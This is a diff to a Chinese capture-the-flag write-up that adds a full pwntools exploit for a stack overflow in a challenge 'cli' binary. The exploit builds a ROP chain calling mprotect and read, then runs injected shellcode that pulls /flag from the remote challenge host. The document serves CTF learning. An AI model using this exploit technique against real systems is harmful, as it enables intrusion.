@@ -280,7 +280,7 @@ chrooot 1337 1337 /cli /cli
 
 当我们连接到 `n1ctf.2025.remote:13227` 时，我们首先交互的是 `cli` 进程。
 
-首先分析 cli，程序扣了符号表，可以用 sig 文件简单恢复一下，然后拖给 ai 分析。
+首先分析 cli，程序扣了符号表，可以用 sig 文件简单恢复一下，然后拖给 ai 分析（我把用到的 sig 文件放在目录下了）。
 
 逆向一下逻辑，发现 `sub_4EC110((unsigned int)"%[^\n]%1[\n]", (unsigned int)v62, ...)` 这一行是 `scanf("%[^\n]", v62)`。`scanf` 没有检查输入的长度，它会无限地写入 `v62`，导致经典的栈溢出。
 
@@ -569,3 +569,59 @@ SUCCESS: Kernel quirk verified! Received null credentials.
 
 1. 关闭写入信道（向服务器发送 FIN 包，告诉它“我发完了”）。
 2. 但它保持读取信道处于打开 (OPEN) 状态！
+
+
+exp 如下：
+
+```python
+from pwn import *
+import os
+import time
+
+context.log_level = 'debug'
+context.arch = 'amd64'
+p = remote("n1ctf.2025.remote", 13227)
+
+if True:
+    p.recvuntil(b'use `kctf-pow solve` to prove yourself :)')
+    p.recvline()
+    pow = p.recvline(False).decode()
+    ans = os.popen(f'./kctf-pow solve {pow}', 'r').read()
+    p.sendline(ans)
+
+MPROTECT = 5488848
+READ = 5485696
+SC = asm('lea rbp,[rsp-512]\n' +
+         shellcraft.read(0, 'rbp', 256) +
+         shellcraft.write(3, 'rbp', 256) +
+         'mov rsi,1' +
+         shellcraft.shutdown(3) +
+         shellcraft.read(3, 'rbp', 256) +
+         shellcraft.write(1, 'rbp', 256) +
+         "int3")
+
+
+def call3(a1, a2, a3, call):
+    return p64(0x407630) + p64(a1) + p64(0x44ccfe) + p64(a2) + p64(0x4bdf0c) + p64(a3) + p64(call)
+
+
+payload = [
+    b'a' * 0x138,
+    call3(0x400000, 0x2000, 7, MPROTECT),
+    call3(0, 0x400000, len(SC), READ),
+    p64(0x400000)
+]
+payload = b''.join(payload)
+
+p.recvuntil(b'(Ctrl+D to exit):')
+time.sleep(2)
+p.sendline(util.fiddling.tty_escape(payload))
+
+pause()
+p.send(util.fiddling.tty_escape(SC))
+
+pause()
+p.send('/flag'.rjust(256, '/'))
+
+p.interactive()
+```
